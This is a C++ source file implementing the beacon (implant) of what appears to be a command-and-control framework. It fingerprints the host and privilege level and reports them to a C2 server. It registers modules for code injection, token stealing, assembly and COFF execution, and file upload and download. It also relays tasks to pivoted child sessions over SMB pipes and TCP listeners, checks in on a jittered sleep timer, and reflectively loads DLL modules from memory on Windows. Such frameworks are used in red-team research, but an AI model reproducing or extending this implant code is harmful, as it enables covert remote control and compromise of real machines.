#include "Beacon.hpp"

#include <random>

#ifdef __linux__

#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>
#include <sys/utsname.h>

#elif _WIN32

#include <wtsapi32.h>
#include <MemoryModule.h>

#define INFO_BUFFER_SIZE 32767
#define  ENV_VAR_STRING_COUNT  (sizeof(envVarStrings)/sizeof(TCHAR*))

typedef ModuleCmd* (*constructProc)();

#pragma comment(lib, "Wtsapi32.lib")

#endif

using namespace std;


#ifdef __linux__
#elif _WIN32

enum IntegrityLevel 
{
	INTEGRITY_UNKNOWN,
	UNTRUSTED_INTEGRITY,
	LOW_INTEGRITY,
	MEDIUM_INTEGRITY,
	HIGH_INTEGRITY,
};

IntegrityLevel GetCurrentProcessIntegrityLevel() 
{
	HANDLE hToken = NULL;
	BOOL result = false;
	TOKEN_USER* tokenUser = NULL;
	DWORD dwLength = 0;

	OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);

	DWORD token_info_length = 0;
	if (::GetTokenInformation(hToken, TokenIntegrityLevel,
		nullptr, 0, &token_info_length) ||
		::GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
		return INTEGRITY_UNKNOWN;
	}

	auto token_label_bytes = std::make_unique<char[]>(token_info_length);
	TOKEN_MANDATORY_LABEL* token_label =
		reinterpret_cast<TOKEN_MANDATORY_LABEL*>(token_label_bytes.get());
	if (!::GetTokenInformation(hToken, TokenIntegrityLevel,
		token_label, token_info_length,
		&token_info_length)) {
		return INTEGRITY_UNKNOWN;
	}
	DWORD integrity_level = *::GetSidSubAuthority(
		token_label->Label.Sid,
		static_cast<DWORD>(*::GetSidSubAuthorityCount(token_label->Label.Sid) -
			1));

	if (integrity_level < SECURITY_MANDATORY_LOW_RID)
		return UNTRUSTED_INTEGRITY;

	if (integrity_level < SECURITY_MANDATORY_MEDIUM_RID)
		return LOW_INTEGRITY;

	if (integrity_level >= SECURITY_MANDATORY_MEDIUM_RID &&
		integrity_level < SECURITY_MANDATORY_HIGH_RID) {
		return MEDIUM_INTEGRITY;
	}

	if (integrity_level >= SECURITY_MANDATORY_HIGH_RID)
		return HIGH_INTEGRITY;

	return INTEGRITY_UNKNOWN;
}
#endif


Beacon::Beacon(std::string& ip, int port)
{
	m_ip = ip;
	m_port = port;
	m_beaconHash = random_string(SizeBeaconHash);
	m_aliveTimerMs = 5000;

#ifdef __linux__

	std::unique_ptr<AssemblyExec> assemblyExec = std::make_unique<AssemblyExec>();
	m_moduleCmd.push_back(std::move(assemblyExec));

	std::unique_ptr<Upload> upload = std::make_unique<Upload>();
	m_moduleCmd.push_back(std::move(upload));

	std::unique_ptr<Run> run = std::make_unique<Run>();
	m_moduleCmd.push_back(std::move(run));

	std::unique_ptr<Download> download = std::make_unique<Download>();
	m_moduleCmd.push_back(std::move(download));

	std::unique_ptr<Inject> inject = std::make_unique<Inject>();
	m_moduleCmd.push_back(std::move(inject));
	
	std::unique_ptr<Script> script = std::make_unique<Script>();
	m_moduleCmd.push_back(std::move(script));

	std::unique_ptr<PrintWorkingDirectory> printWorkingDirectory = std::make_unique<PrintWorkingDirectory>();
	m_moduleCmd.push_back(std::move(printWorkingDirectory));

	std::unique_ptr<ChangeDirectory> changeDirectory = std::make_unique<ChangeDirectory>();
	m_moduleCmd.push_back(std::move(changeDirectory));

	std::unique_ptr<ListDirectory> listDirectory = std::make_unique<ListDirectory>();
	m_moduleCmd.push_back(std::move(listDirectory));

	std::unique_ptr<ListProcesses> listProcesses = std::make_unique<ListProcesses>();
	m_moduleCmd.push_back(std::move(listProcesses));

	std::unique_ptr<MakeToken> makeToken = std::make_unique<MakeToken>();
	m_moduleCmd.push_back(std::move(makeToken));
	
	std::unique_ptr<Rev2self> rev2self = std::make_unique<Rev2self>();
	m_moduleCmd.push_back(std::move(rev2self));

	std::unique_ptr<StealToken> stealToken = std::make_unique<StealToken>();
	m_moduleCmd.push_back(std::move(stealToken));

	std::unique_ptr<CoffLoader> coffLoader = std::make_unique<CoffLoader>();
	m_moduleCmd.push_back(std::move(coffLoader));

#elif _WIN32
#endif

#ifdef __linux__

	char hostname[HOST_NAME_MAX];
	char username[LOGIN_NAME_MAX];
	gethostname(hostname, HOST_NAME_MAX);
	getlogin_r(username, LOGIN_NAME_MAX);

	m_hostname = hostname;
	m_username = username;

	uid_t uid = geteuid ();
	struct passwd *pw = getpwuid (uid);
	if (pw)
		m_username = std::string(pw->pw_name);

	struct utsname unameData;
	uname(&unameData);

	// TODO what to do with all that info ?? How to get it ??
	// std::cout << unameData.sysname << std::endl;
	// std::cout << unameData.nodename << std::endl;
	// std::cout << unameData.release << std::endl;
	// std::cout << unameData.version << std::endl;
	// std::cout << unameData.machine << std::endl;

	m_arch = unameData.machine;

	m_privilege = "user";
	if(m_username=="root")
		m_privilege = "root";
	
	m_os = unameData.sysname;
	m_os += " ";
	m_os += unameData.release;

#elif _WIN32

	TCHAR  infoBuf[INFO_BUFFER_SIZE];
	DWORD  bufCharCount = INFO_BUFFER_SIZE;

	// Get and display the name of the computer.
	m_hostname = "unknown";
	if( GetComputerName( infoBuf, &bufCharCount ) )
		m_hostname = infoBuf;

	std::string username1;
    if( GetUserName( infoBuf, &bufCharCount ) )
    	username1 = infoBuf;

	// ??
	std::string acctName;
	std::string domainname;

	TOKEN_USER tokenUser;
	ZeroMemory(&tokenUser, sizeof(TOKEN_USER));
	DWORD tokenUserLength = 0;

	PTOKEN_USER pTokenUser;
	GetTokenInformation(GetCurrentProcessToken(), TOKEN_INFORMATION_CLASS::TokenUser, NULL,      
	0, &tokenUserLength);
	pTokenUser = (PTOKEN_USER) new BYTE[tokenUserLength];

	if (GetTokenInformation(GetCurrentProcessToken(), TOKEN_INFORMATION_CLASS::TokenUser, pTokenUser, tokenUserLength, &tokenUserLength))
	{
		TCHAR szUserName[_MAX_PATH];
		DWORD dwUserNameLength = _MAX_PATH;
		TCHAR szDomainName[_MAX_PATH];
		DWORD dwDomainNameLength = _MAX_PATH;
		SID_NAME_USE sidNameUse;
		LookupAccountSid(NULL, pTokenUser->User.Sid, szUserName, &dwUserNameLength, szDomainName, &dwDomainNameLength, &sidNameUse);
		acctName=szUserName;
		domainname=szDomainName;
		delete pTokenUser;
	}

	if(!domainname.empty())
		m_username+=domainname;
	else if(!m_hostname.empty())
		m_username+=m_hostname;
	else 
		m_username+=".";

	m_username+="\\";
	if(!acctName.empty())
		m_username+=acctName;
	else if(!username1.empty())
		m_username+=username1;
	else 
		m_username+="unknow";

	SYSTEM_INFO systemInfo = { 0 };
	GetNativeSystemInfo(&systemInfo);

	m_arch = "x64";
	if (systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
		m_arch = "x86";

	m_os = "Windows";

	IntegrityLevel integrityLevel = GetCurrentProcessIntegrityLevel();

	m_privilege = "-";
	if (integrityLevel == INTEGRITY_UNKNOWN)
		m_privilege = "UNKNOWN";
	else if (integrityLevel == UNTRUSTED_INTEGRITY)
		m_privilege = "UNTRUSTED";
	else if (integrityLevel == LOW_INTEGRITY)
		m_privilege = "LOW";
	else if (integrityLevel == MEDIUM_INTEGRITY)
		m_privilege = "MEDIUM";
	else if (integrityLevel == HIGH_INTEGRITY)
		m_privilege = "HIGH";

#endif
}


bool Beacon::cmdToTasks(const std::string& input)
{
	MultiBundleC2Message multiBundleC2Message;
	multiBundleC2Message.ParseFromArray(input.data(), (int)input.size());

	for (int k = 0; k < multiBundleC2Message.bundlec2messages_size(); k++) 
	{
		BundleC2Message* bundleC2Message = multiBundleC2Message.bundlec2messages(k);

		// Handle own tasks
		std::string beaconhash = bundleC2Message->beaconhash();
		if(beaconhash==m_beaconHash)
		{
			for (int j = 0; j < bundleC2Message->c2messages_size(); j++) 
			{
				const C2Message& c2Message = bundleC2Message->c2messages(j);
				m_tasks.push(c2Message);
			}
		}
		// handle child sessions tasks
		else
		{
			for(int i=0; i<m_listeners.size(); i++)
			{
				for(int j=0; j<m_listeners[i]->getNumberOfSession(); j++)
				{
					std::shared_ptr<Session> ptr = m_listeners[i]->getSessionPtr(j);

					if(ptr->getBeaconHash()==beaconhash)
					{
						for (int k = 0; k < bundleC2Message->c2messages_size(); k++) 
						{
							const C2Message& c2Message = bundleC2Message->c2messages(k);
							m_listeners[i]->queueTask(beaconhash, c2Message);
						}
					}
				}
			}
		}
	}

	return true;
}


bool Beacon::taskResultsToCmd(std::string& output)
{
	MultiBundleC2Message multiBundleC2Message;
	BundleC2Message *bundleC2Message = multiBundleC2Message.add_bundlec2messages();

	// Handle own results
	bundleC2Message->set_beaconhash(m_beaconHash);
	bundleC2Message->set_hostname(m_hostname);
	bundleC2Message->set_username(m_username);
	bundleC2Message->set_arch(m_arch);
	bundleC2Message->set_privilege(m_privilege);
	bundleC2Message->set_os(m_os);

	while(!m_taskResult.empty())
	{
		C2Message c2MessageRet=m_taskResult.front();
		C2Message *addedC2MessageRet = bundleC2Message->add_c2messages();
		addedC2MessageRet->CopyFrom(c2MessageRet);
		m_taskResult.pop();
	}

	// handle child sessions results
	for(int i=0; i<m_listeners.size(); i++)
	{
		for(int j=0; j<m_listeners[i]->getNumberOfSession(); j++)
		{
			std::shared_ptr<Session> ptr = m_listeners[i]->getSessionPtr(j);

			BundleC2Message *bundleC2Message = multiBundleC2Message.add_bundlec2messages();

			// If it's the first listener to handle the message
			if(bundleC2Message->listenerhash().empty())
				bundleC2Message->set_listenerhash(m_listeners[i]->getListenerHash());

			bundleC2Message->set_beaconhash(ptr->getBeaconHash());
			bundleC2Message->set_hostname(ptr->getHostname());
			bundleC2Message->set_username(ptr->getUsername());
			bundleC2Message->set_arch(ptr->getArch());
			bundleC2Message->set_privilege(ptr->getPrivilege());
			bundleC2Message->set_os(ptr->getOs());

			C2Message c2Message = ptr->getTaskResult();
			while(!c2Message.instruction().empty())
			{
				C2Message *addedC2MessageRet = bundleC2Message->add_c2messages();
				addedC2MessageRet->CopyFrom(c2Message);
				c2Message = ptr->getTaskResult();
			}
		}
	}

	multiBundleC2Message.SerializeToString(&output);

	return true;
}

bool Beacon::runTasks()
{
	while(!m_tasks.empty())
	{
		C2Message c2Message = m_tasks.front();
		m_tasks.pop();

		C2Message c2RetMessage;
		bool exit = execInstruction(c2Message, c2RetMessage);

		std::string out;
		c2RetMessage.SerializeToString(&out);

		m_taskResult.push(c2RetMessage);

		if(exit)
			return exit; 
	}

	return false;
}


void Beacon::sleep()
{
	if(m_aliveTimerMs<=0)
	{
		std::this_thread::sleep_for(std::chrono::milliseconds(50));
	}
	else
	{
		int dela = rand()%(int(float(m_aliveTimerMs)/100.0*20.0))-int(float(m_aliveTimerMs)/100.0*10.0);
		int timeToSleepMs = m_aliveTimerMs + dela;
		std::this_thread::sleep_for(std::chrono::milliseconds(timeToSleepMs));
	}
}


// Main function that execute cmd
bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
{
	string instruction = c2Message.instruction();
	string cmd = c2Message.cmd();

	c2RetMessage.set_instruction(instruction);
	c2RetMessage.set_cmd(cmd);

	if (instruction == EndCmd)
	{
		c2RetMessage.set_returnvalue(CmdStatusSuccess);
		return true;
	}
	else if (instruction == SleepCmd)
	{
		std::string newSleepTimer = c2Message.cmd();
		
		try 
		{
			m_aliveTimerMs = std::stoi(newSleepTimer)*1000;
		}
		catch (const std::invalid_argument& ia) 
		{
			newSleepTimer = CmdStatusFail;
		}

		c2RetMessage.set_returnvalue(newSleepTimer);
	}
	else if(instruction == ListenerCmd)
	{
		std::vector<std::string> splitedCmd;
		std::string delimiter = " ";
		splitList(cmd, delimiter, splitedCmd);

		if(splitedCmd[0]==StartCmd)
		{
			if(splitedCmd[1]=="smb")
			{
				std::string pipeName = splitedCmd[2];
				int localPort = 0;

				std::vector<unique_ptr<Listener>>::iterator object = 
					find_if(m_listeners.begin(), m_listeners.end(),
							[&](unique_ptr<Listener> & obj){ return obj->getHost() == pipeName;}
							);

				if(object!=m_listeners.end())
				{
					std::string msg = "Listener already exist";
					// Respond the listener already exist
					c2RetMessage.set_cmd("");
					c2RetMessage.set_returnvalue(msg);
				}
				else
				{
					std::unique_ptr<ListenerSmb> listenerSmb = make_unique<ListenerSmb>(pipeName, localPort);
					std::string listenerHash = listenerSmb->getListenerHash();
					m_listeners.push_back(std::move(listenerSmb));

					// Respond with the listener hash
					c2RetMessage.set_cmd(cmd);
					c2RetMessage.set_returnvalue(listenerHash);
				}
			}
			else if(splitedCmd[1]=="tcp")
			{
				std::string localHost = splitedCmd[2];
				int localPort = std::stoi(splitedCmd[3]);

				std::vector<unique_ptr<Listener>>::iterator object = 
					find_if(m_listeners.begin(), m_listeners.end(),
							[&](unique_ptr<Listener> & obj){ return obj->getPort() == localPort;}
							);

				if(object!=m_listeners.end())
				{
					std::string msg = "Listener already exist";
					// Respond the listener already exist
					c2RetMessage.set_cmd("");
					c2RetMessage.set_returnvalue(msg);
				}
				else
				{
					// TODO fail ??
					std::unique_ptr<ListenerTcp> listenerTcp = make_unique<ListenerTcp>(localHost, localPort);
					std::string listenerHash = listenerTcp->getListenerHash();
					m_listeners.push_back(std::move(listenerTcp));

					// Respond with the listener hash
					c2RetMessage.set_cmd(cmd);
					c2RetMessage.set_returnvalue(listenerHash);
				}
			}
		}
		else if(splitedCmd[0]==StopCmd)
		{
			std::string listenerHash=splitedCmd[1];

			std::vector<unique_ptr<Listener>>::iterator object = 
				find_if(m_listeners.begin(), m_listeners.end(),
						[&](unique_ptr<Listener> & obj){ return obj->getListenerHash() == listenerHash;}
						);

			std::string msg = "hash not found";
			if(object!=m_listeners.end())
			{
				m_listeners.erase(std::remove(m_listeners.begin(), m_listeners.end(), *object));
				std::move(*object);
				msg = listenerHash;
			}
			else 
				cmd="";

			c2RetMessage.set_cmd(cmd);
			c2RetMessage.set_returnvalue(msg);
		}
	}
	else if(instruction == LoadC2Module)
	{
#ifdef __linux__
#elif _WIN32

		const std::string buffer = c2Message.data();

		HMEMORYMODULE handle = NULL;
		handle = MemoryLoadLibrary((char*)buffer.data(), buffer.size());
		if (handle == NULL)
		{
			DWORD errorMessageID = ::GetLastError();
			if(errorMessageID == 0) {
				return false;
			}

			LPSTR messageBuffer = nullptr;

			//Ask Win32 to give us the string version of that message ID.
			//The parameters we pass in, tell Win32 to create the buffer that holds the message for us (because we don't yet know how long the message string will be).
			size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
										NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);
			
			//Copy the error message into a std::string.
			std::string message(messageBuffer, size);
			
			//Free the Win32's string's buffer.
			LocalFree(messageBuffer);

			std::string msg = "Error MemoryLoadLibrary: ";
			msg+=message;
			c2RetMessage.set_returnvalue(msg);
			return false;
		}

		// the DLL only exports one function, try to load by ordinal value
		// If the dll export multiple function we got to make sur the export function come first (alphabetical number)
		constructProc construct;
		construct = (constructProc)MemoryGetProcAddress(handle, reinterpret_cast<LPCSTR>(0x01));
		if (!construct != NULL) 
		{
			std::string msg = "Error MemoryGetProcAddress";
			c2RetMessage.set_returnvalue(msg);
			return false;
		}
    
        ModuleCmd* moduleCmd = construct();

		std::unique_ptr<ModuleCmd> moduleCmd_(moduleCmd);
		m_moduleCmd.push_back(std::move(moduleCmd_));

		std::string msg = "Module loaded successfully:\n";
		msg += m_moduleCmd.back()->getInfo();
		c2RetMessage.set_returnvalue(msg);

#endif
	}
	else if(instruction == UnloadC2Module)
	{
#ifdef __linux__
#elif _WIN32
		std::string moduleName = c2Message.cmd();

		std::vector<unique_ptr<ModuleCmd>>::iterator object = 
			find_if(m_moduleCmd.begin(), m_moduleCmd.end(),
					[&](unique_ptr<ModuleCmd> & obj){ return obj->getName() == moduleName;}
					);

		std::string msg = "module not found";
		if(object!=m_moduleCmd.end())
		{
			m_moduleCmd.erase(std::remove(m_moduleCmd.begin(), m_moduleCmd.end(), *object));
			std::move(*object);
			msg = "Module ";
			msg += moduleName;
			msg += " removed.";
		}

		c2RetMessage.set_returnvalue(msg);
#endif
	}
	else
	{
		bool isModuleFound=false;
		for(auto it = m_moduleCmd.begin() ; it != m_moduleCmd.end(); ++it )
		{
			if (instruction == (*it)->getName())
			{
				(*it)->process(c2Message, c2RetMessage);
				isModuleFound=true;
			}
		}
		if(!isModuleFound)
		{
			std::string msg = "Module ";
			msg+=instruction;
			msg+=" not found.";
			c2RetMessage.set_returnvalue(msg);
		}
	}

	return false;
}



